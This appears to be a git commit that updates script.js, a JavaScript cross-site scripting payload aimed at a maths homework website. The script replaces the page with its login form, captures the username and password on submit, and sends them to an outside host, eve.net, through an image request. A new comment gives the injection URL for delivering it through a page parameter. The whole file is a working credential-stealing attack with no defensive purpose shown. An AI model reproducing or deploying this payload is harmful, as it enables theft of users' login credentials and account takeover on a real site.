d84924f7979eaeaff5700276e1c952ebb3e776dc
soesam <67687007+soesam@users.noreply.github.com>
2020-07-09 00:20:13 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
 (async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="//eve.net/"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid=10972720",1e3)}),4e3);</script>`))()
+
+// loader:
+// https://drfrostmaths.com/worksheets.php?topic=[insert fake topic here]&wdid=-3;</script><script src=[url to this script]><!--
